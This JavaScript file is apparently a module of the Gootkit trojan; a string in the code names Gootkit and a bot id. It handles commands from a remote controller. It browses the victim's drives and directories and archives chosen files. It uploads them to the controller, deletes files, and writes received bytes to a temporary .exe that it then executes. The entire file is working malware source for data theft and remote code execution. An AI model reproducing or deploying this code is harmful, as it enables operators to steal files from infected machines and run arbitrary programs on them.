var fs = require('fs');
var path = require('path');
var zlib = require('zlib');
var net = require('net');
var stream = require('stream');
var util = require('util');
var suspend = require('suspend');
var cabfile = process.binding('cabfile');
var child_process = require('child_process');
var gzipper = require('tar_stream');

var protobuf = require('protocol_buffers')

var messages = protobuf([
  'message FileUpload {\r',
  '    optional string filename = 1;',
  '    optional bytes  content = 2;',
  '}',
  'message FileAttribues {\r',
  '    optional string name = 1;\r',
  '    optional string realname = 2;\r',
  '    optional bool isFile = 3;\r',
  '    optional bool isDirectory = 4;\r',
  '    optional bool isBlockDevice = 5;\r',
  '    optional bool isSymbolicLink = 6;\r',
  '    optional int64 size = 7;\r',
  '    optional int64 ctime = 8;\r',
  '    optional int64 atime = 9;\r',
  '}\r',
  '\r',
  'message DirectoryListing{\r',
  '    repeated FileAttribues files = 1;\r',
  '}' 
].join('\n'));

var print = console.log;
process.downloads = {};
var MyPacketId;


const FS_READDIR = 1;
const FS_GETFILE = 2;
const FS_GETMULTIPLEFILES = 3;
const FS_REMOVEMULTIPLEFILES = 4;
const FS_FILEEXECUTION = 5;

const FS_PUTFILE = 6;

function getRandomArbitrary(min, max) {
	return Math.floor(Math.random() * (max - min) + min);
}

function getRandomInt() {
	return getRandomArbitrary(0, 0xffffffff);
}


function BuildPacket(requestId, status, data)
{
	var packet;

	if(data){
		packet = new Buffer(
			2  +
			4  +
			1  +
			data.length
		);
	}
	else
	{
		packet = new Buffer(
			2  +
			4  +
			1 
		);
	}
	
	packet.writeUInt16BE(MyPacketId, 0);
	packet.writeUInt32BE(requestId, 2);
	packet.writeUInt8(status, 6);

	if(data)
		data.copy(packet, 7);

	return packet;
}

var OnPacket = suspend(function*(outstream, data) 
{
	
	var func = data.readUInt8();
	var requestId = data.readUInt32BE(1);

	

	try
	{
		switch(func)
		{

			case FS_READDIR:

				var directory_path = data.slice(5).toString('utf8');
				
				var out_files = [];

				if (directory_path === '[DRIVES_LIST]') {

					let letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';

					for (var i = 0; i < letters.length; i++) {
						try {

							var drive = letters.charAt(i) + ':\\';
							var stat = yield fs.stat(drive, suspend.resume());

							out_files.push
							({
								'name': drive,
								'directory_path': drive
							});

						} catch (e) {

						}
					}
				}
				else 
				{
					try 
					{
					  
						let files = yield fs.readdir(directory_path, suspend.resume());

						let currentDirectory = path.resolve(directory_path);
						let parentDirectory = path.resolve(path.join(directory_path, '..'));
						
						
						

						if (parentDirectory === currentDirectory) {
							parentDirectory = '[DRIVES_LIST]';
						}

						

						out_files.push({ 
							name: '..', 
							realname: parentDirectory,
							isDirectory : true
						});

						for (let i = 0; i < files.length; i++) 
						{
							let filename = path.join(directory_path, files[i]);

							try{
								var stat = yield fs.stat(filename, suspend.resume());
								if (stat) {
									out_files.push({
										name: files[i],
										realname: filename,
										isFile: stat.isFile(),
										isDirectory: stat.isDirectory(),
										isBlockDevice: stat.isBlockDevice(),
										isSymbolicLink: stat.isSymbolicLink(),
										size: stat.size,
										ctime: stat.ctime.getTime(),
										atime: stat.atime.getTime()
									});
								}
							}catch(exceptionx){
								out_files.push({
									name: files[i],
									realname: filename
								});
							}
						}
					} 
					catch (exc) 
					{
						print(exc);
						outstream.sendProtocolPacket(
							MyPacketId, requestId, 
							0xFE, new Buffer(exc.message));
						return;
					}
				}

				

				var buffer = messages.DirectoryListing.encode({files : out_files});

				outstream.sendProtocolPacket(
					MyPacketId, requestId, 0x00, buffer);

				break;
				
			case FS_GETFILE :
				var filename = data.slice(5).toString('utf8');
				

				outstream.pushFileToServer(filename, requestId);


				break;

			case FS_GETMULTIPLEFILES :

				var filenames = data.slice(5).toString('utf8').split('|');
				var cabFilePath =  path.join(process.env['temp'], (new Date().getTime() + '.cab'));
				var tmpDirectory =  path.join(process.env['temp'], new Date().toUTCString().replace(/\:|\s+|\,/g,'_') );

				print('tmpDirectory %s', tmpDirectory);

				fs.mkdirSync(tmpDirectory);
				fs.writeFileSync(
					tmpDirectory + "\\descr.txt", 
					[
						"Uploaded by Gootkit :D",
						"botid : ",
						process.machineGuid,
						"",
						"Date : ",
						new Date().toUTCString(),
						"",
						"Original filenames : ",
						"",
						filenames.join("\r\n")
					].join("\r\n")
				);

				for(let i = 0; i < filenames.length; i ++){

					var remotepath = path.join(tmpDirectory, path.basename(filenames[i]));

					if(fs.lstatSync(filenames[i]).isDirectory()){
						
						fs.mkdirSync(remotepath);
						
						var result = yield fs.ncp(
							filenames[i], 
							remotepath, 
							{limit : 512},
							suspend.resume() 
						);
					}else{
						var result = yield fs.copyFile(filenames[i], remotepath, suspend.resume() );
					}				    
				}

				gzipper.gzcompress({
					source: tmpDirectory,
					destination: tmpDirectory + '_.tar.gz',
					level: 6, 
					memLevel: 6 
				}, function () {
					setTimeout(function(){
						outstream.pushFileToServer(tmpDirectory + '_.tar.gz', requestId, true);
						fs.removeRecursive(tmpDirectory, function(){});
					}, 100);  
				});

				break;

			case FS_REMOVEMULTIPLEFILES :

				var filenames = data.slice(5).toString('utf8').split('|');
				
				
				try
				{	
					for(let i = 0; i < filenames.length; i ++)
					{
						try
						{
							let x = yield fs.unlink(filenames[i], suspend.resume());
						}
						catch (exc) 
						{

						}
					};

					outstream.sendProtocolPacket(
						MyPacketId, requestId, 0x00);
				}
				catch (exc) 
				{
					print(exc);
					outstream.sendProtocolPacket(
						MyPacketId, requestId, 
						0xFE, new Buffer(exc.message));
					return;
				}

				break;
			case FS_FILEEXECUTION :
				var fileBuffer = data.slice(5);
				
				var filepath = path.join(process.env['temp'], getRandomInt() + '.exe');
				
				fs.writeFile(filepath, fileBuffer, function(error){
					if(error)
					{
					    

						outstream.sendProtocolPacket(
							MyPacketId, requestId, 0xFE, 
							new Buffer(error.message));
					}
					else
					{
					    
						child_process.execFile(filepath);
						outstream.sendProtocolPacket(
							MyPacketId, requestId, 0x00, new Buffer(filepath));
					}
				});

				break;
		    case FS_PUTFILE :
		        var requestData = data.slice(5);
		        
		        

		        if(!process.downloads[requestId])
		        {
		            process.downloads[requestId] = {};

		            var dwnl = process.downloads[requestId];

		            dwnl.done = 0;
		            dwnl.length = requestData.readUInt32BE(0);
		            dwnl.filename = requestData.toString('utf8', 0 + 4 + 2 , requestData.readUInt16BE(4) + 0 + 4 + 2);
				    
		            dwnl.filepath = path.join(process.env['temp'], dwnl.filename);

		            
		            

		            dwnl.writeStream = fs.createWriteStream(dwnl.filepath);
		            process.log('download started : ', dwnl.filepath, ' length:', dwnl.length);

		        }else{
                    
		            var dwnl = process.downloads[requestId];

		            dwnl.done += requestData.length;

		            

		            if(dwnl.writeStream.write(requestData) === false){

		                outstream.botSocket.pause();
		                outstream.pause();

		                dwnl.writeStream.once('drain', function(){
		                    outstream.botSocket.resume();
		                    outstream.resume();
		                })
		            }

		            if(dwnl.done === dwnl.length)
		            {
		                

		                

		                dwnl.writeStream.on('finish', function() 
		                {
		                    dwnl.writeStream.close();

		                    outstream.botSocket.resume();
		                    outstream.resume();

		                    outstream.sendProtocolPacket(
							    MyPacketId, requestId, 0x00, new Buffer(dwnl.filepath));

		                    process.log('file downloaded', dwnl.filepath);

		                    delete process.downloads[requestId];

		                });

		                dwnl.writeStream.end();
		            }

		        }
		        


		        break;
			default:
				outstream.sendProtocolPacket(
					MyPacketId, requestId, 0xFF);
				break;
			
		}

	}
	catch(exception)
	{
	    
	    
		
		outstream.sendProtocolPacket(
			MyPacketId, requestId, 0xFE, 
			new Buffer(exception.message));
	}

});

var uploadLocalFile = suspend(function*(filename, cb)
{
	if(!util.isUndefined(process.controllerConnection))
	{
		process.controllerConnection.sendProtocolPacket(
			MyPacketId, 
			FS_PUTFILE, 
			0x00, 
			new Buffer(filename)
		);
	}
});

exports.register = function (prtocolId, packetParsers, procolPacketBuilders) {
	

	MyPacketId = prtocolId;

	process.uploadLocalFile = uploadLocalFile;
	packetParsers[prtocolId] = OnPacket;
	procolPacketBuilders[prtocolId] = BuildPacket;
}